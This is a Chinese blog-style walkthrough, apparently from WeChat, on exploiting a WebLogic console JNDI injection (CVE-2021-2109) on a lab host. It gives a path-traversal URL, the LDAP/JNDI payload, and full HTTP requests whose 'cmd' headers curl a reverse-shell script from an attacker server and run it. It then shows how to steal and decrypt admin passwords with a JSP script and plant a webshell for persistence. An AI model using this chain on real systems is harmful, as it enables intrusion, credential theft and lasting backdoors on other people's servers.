> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/PuHjPUnYq1ah_F9NkSOACg)

### 漏洞影响

WebLogic Server 10.3.6.0.0

WebLogic Server 12.1.3.0.0

WebLogic Server 12.2.1.3.0

WebLogic Server 12.2.1.4.0

WebLogic Server 14.1.1.0.0

### 漏洞复现

访问一下 URL

http://xxx.xxx.xxx.xxx:7001/console/css/%252e%252e%252f/consolejndi.portal

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLknlRfsic8XkCtS1exdQBE2JtxPKoXYKxPic8IkiasVkR7GvFBXHJdk4QNNw/640?wx_fmt=png)

如果有此页面未授权可访问，且在影响范围内则可能出现漏洞

下载漏洞攻击需要的 LDAP 启动脚本

```
https://github.com/feihong-cs/JNDIExploit/releases/tag/v.1.11 #下载地址
unzip JNDIExploit.v1.11.zip 
java -jar JNDIExploit.v1.11.jar -i xxx.xxx.xxx.xxx #启动
```

服务器启动，注意放行服务器端口，切 jdk 版本为低版本，我用到 jdk8

```
java -jar JNDIExploit-v1.11.jar -i xxx.xxx.xxx.xxx (服务器地址)
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLkn1x3GBCibMvEA6QwZbIm7C0GdrD9p3bfbQc1cHiaNAiahKOr5Sd4ZUG9xQ/640?wx_fmt=png)

然后配合 Weblogic 未授权范围 命令执行

```
/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22)
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLknNuUaGgAQ250F3yzgKDoEiaALiae1rLHDTUfaZ1Y0pFqKicXCF9XyZCDDA/640?wx_fmt=png)

登录后台可使用此 POC，未授权的话用上面的

```
/console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22)
```

### 深入系列一、反弹 shell

#### 第一步 准备 shell

先写一个反弹 shell 的 sh 在 vps 上

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLkn7v0HxC87SP1jE54Y6A7yRc7ibbNfYYBmDNwaDQnZs8bibFIPpz6ECPuQ/640?wx_fmt=png)

然后开启监听

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLknehadvWFrzvDrNdibM2wa7o2L6SNeBJDx7Dtwicq6ZR7yLOTED2dTmIng/640?wx_fmt=png)

接着开启一个 http 服务

```
python3 -m http.server 8000
```

#### 第二步 把 shell 下载到被攻击机器上

```
curl -o /target/path/filename http://xxx.xxx.xxx.xxx.:8080/1.sh
或者
curl -L http://xxx.xxx.xxx.xxx:8080/1.sh -o /target/path/filename
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLknVr1srUySs0YxzbtyW1yCITDqVwKHrtvDNk8azHsc3gm1xV8RfVVpwg/640?wx_fmt=png)

请求包  

```
GET /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1
Host: 192.168.0.103:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
cmd:curl -o /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/1.sh  http://xxx.xxx.xxx.xxx:8000/1.sh 
Cookie: ADMINCONSOLESESSION=eGtTalBHY2b2h6x6DfgCrJxbHuT0iMHoaHMslzKGh8mUYeqeRMlD!1764575979
Upgrade-Insecure-Requests: 1
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLknRyyb44Qy1XImAYyibn27dDgYBO2OHriaoWkM61FLtZxIx0ZX7kekIX9w/640?wx_fmt=png)

#### 第三步 反弹 shell

进行 bash 反弹

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLknNEzP5wib41NhZeLdyr2ibywhnEqgYv5uRfrj5RGTCGcdQarL6I1XaibLg/640?wx_fmt=png)

请求包  

```
GET /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1
Host: 192.168.0.103:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
cmd:bash /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/1.sh 
Cookie: ADMINCONSOLESESSION=eGtTalBHY2b2h6x6DfgCrJxbHuT0iMHoaHMslzKGh8mUYeqeRMlD!1764575979
Upgrade-Insecure-Requests: 1
```

成功反弹到 shell  

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLknpTTd8w7aXghnHeM9Z0ibicRtBkOaKNX7Ub1ZOa5hVmDQWib3a2PNNxlXA/640?wx_fmt=png)

### 深入系列二、通过下载 SerializedSystemIni.da 文件解密 weblogic 账号密码

#### 第一步 找到账号密码和解密文件

账号密码位置

```
/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/security
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLkn4NdIHy76eK6tzFulP2Rlx5tMR6sMdmZ2fBIMKny9ySJp6f9TXXCC7Q/640?wx_fmt=png)

SerializedSystemIni.dat 文件位置

```
/u01/oracle/user_projects/domains/base_domain/security
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLkn5aTfpkWFcxViaUTWeHc8D1XjJnq2iaKs4kxsFD2ia0VTPJjav5Vpzjr4Q/640?wx_fmt=png)

#### 第二步 找到 web 目录

war 目录一般存在的位置

```
/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLknpGicovLaNjFYrzDlJ91yfgMlcVQiaqgToXJZyDOGqvF0R6BgYSePNu5g/640?wx_fmt=png)  

将 SerializedSystemIni.dat 拷贝到 war 目录

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLknzsHw8wHKJwo4QIv2dsOlTkQaglRm9Xr471z9IaMUyPTbpIOxLEjUww/640?wx_fmt=png)

#### 第三步 下载 SerializedSystemIni.dat 并解密

访问 http://192.168.10.53:7001/bea_wls_internal/SerializedSystemIni.dat 将文件下载

下来下

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLknte17GmicgwOia3B7dWico2styTcgCXiakk1pbq0Y8cK0kyebbkb0HicAOzg/640?wx_fmt=png)

使用解密工具解密

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLknsLpAAqdfoBsZb8naJJXLias8lWOQUmBbMYlISIQ8aTUTOjWcia5uHDaQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLkndfQEwrN0rhm8pKCIzwFFLqop9ymCOr8Q7ictI69CUq0M2LjYYFjQmuQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLkn5WuP81ty43zkeeKxdIc5tDmXiaNc7F1fxK4f8aA72W7icyDBhrhfxldQ/640?wx_fmt=png)

tips：如果 AES 加密后的密码为：

`{AES}Nu2LEjo0kxMEd4G5L9bYLE5wI5fztbgeRpFec9wsrcQ\=` 破解时需要把后面的 \ 给去掉，不然会执行报错。

### 深入系列三、上传 webshell

由于反弹的 shell 不够持久，所以想上传个 webshell

#### 第一步  在自己服务器上上传一个马，并且开启下载

我这用的哥斯拉

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLknjHEBpjxhGZMKEymagCjITvUyoMMd3vfSTPDhMJCYjPWWrFKaluMw2w/640?wx_fmt=png)

#### 第二步 下载文件到被攻击者目录下

目录

```
/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLkn8U6RdBVYTmvVe8I4soCDJO2Ku4P4vt6F9YsUboPkq7xfIicoRynyRBQ/640?wx_fmt=png)

打开 http://192.168.10.53:7001/bea_wls_internal/shell.jsp 能成功解析说明存在

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLknKPWDpFonwtfdoxt6IqmUjPPNAgSb5wLT93fyG9ynaOWVJaAeyQJfmQ/640?wx_fmt=png)

tips：如果不确定下载成功没，可以先在服务器上写一个 1.txt 内容随便写，比如：111。然后下载到被攻击服务器的 web 目录上，访问看是否能显示内容

#### 第四步 使用冰蝎连接

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLknlKsSde2TCRZ0ezOoERT3WEA81icvNLuo5FKldtckM9OmfAqzmiaZ3Sdg/640?wx_fmt=png)

### 深入系列四、通过上传解密脚本进行解密（对深入系列二的补充）

#### 第一步：查看 weblogic 的密文

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLkn0N4wMQBBBBDeJFREicbstCJYRoOgAGxzTows4ft0ESkpHnicgGkib6Rhg/640?wx_fmt=png)

#### 第二步：编辑解密文件，并放在另外一台 linux 上，并开启 http 服务

下载地址：

Tools7-get_wls_pwd2

```
<%@page pageEncoding="utf-8"%>
<%@page import="weblogic.security.internal.*,weblogic.security.internal.encryption.*"%>
<%
   EncryptionService es = null;
   ClearOrEncryptedService ces = null;
    String s = null;
    s="{AES}jZaFirdpzkH727wJt82Xc0QtuHsEuMsvyqcLkjRz/vY=";
    es = SerializedSystemIni.getEncryptionService();
    if (es == null) {
       out.println("Unable to initialize encryption service");
        return;
    }
    ces = new ClearOrEncryptedService(es);
    if (s != null) {
        out.println("\nDecrypted Password is:" + ces.decrypt(s));
    }
%>
```

#### 第三步：通过 curl 下载到被攻击机器的 web 目录下

```
curl -o /target/webpath/filename http://xxx.xxx.xxx.xxx.:8080/1.sh
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLknSltDPytDsFiaEtyVgrPdLp8icNfWVymBY7NpHVamlDoGnkTXZ5t73svg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLknGVibnQ4FSC8MeQkVehjl7nHeKfn9mRu0NlsyjqgZ8X6dxaX1IyC7aRw/640?wx_fmt=png)

#### 第四步：访问 url 查看密码

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZ4gPzehL2dMYEen53VkLknVia31Ppdtc4lLfcNswxpxkcYTSWGXPSsDuvW0A5kRccBFFfH2LsQ0cg/640?wx_fmt=png)

### 思考 & 小总结

这个漏洞研究了两三天，前期反弹 shell 挺顺利的，但是遇到其他问题了。文章算是做个笔记总结，如有错误，请指正。

1.  深入系列二中，尝试解密 weblogic 账号密码出了问题，有的环境会因为`SerializedSystemIni.dat`文件为二进制文件，直接使用浏览器下载可能遭到破坏（但是我也尝试 tar 打包下载出来，但是文件也出问题了），所以我在深入系列四中换了另外一种思路进行解密。
    
2.  碰到的实战中把`SerializedSystemIni.dat`文件和下载马子到 web 目录后，通过 web 无法访问到，这样的话深入系列四也无法进行。因此当 web 目录无法访问的时候，想要解密 console 的密码或者拿到 webshell 就比较难了。等后续有时间了会继续摸索其他方法，尝试获取到 webshell（因为反弹的 shell 不持久....）
    

### 参考文章

1.http://wiki.peiqi.tech/PeiQi_Wiki/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-2109.html?h=cve-2021-2109

2.https://www.freebuf.com/articles/web/220147.html

[3.https://mp.weixin.qq.com/s/fhf86-FCic2qAkcThvabeQ](https://mp.weixin.qq.com/s?__biz=Mzg4MDU3Mzc3OQ==&mid=2247483712&idx=1&sn=b77ceb1ca8de6f9e33521c6db5b7dc7e&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_jpg/flBFrCh5pNZ4gPzehL2dMYEen53VkLknyUTQMvic4RibJibGXBljSdsM4aBIN7h7Q4Hy5tvNbvRMugHfjEreKfOrA/640?wx_fmt=jpeg)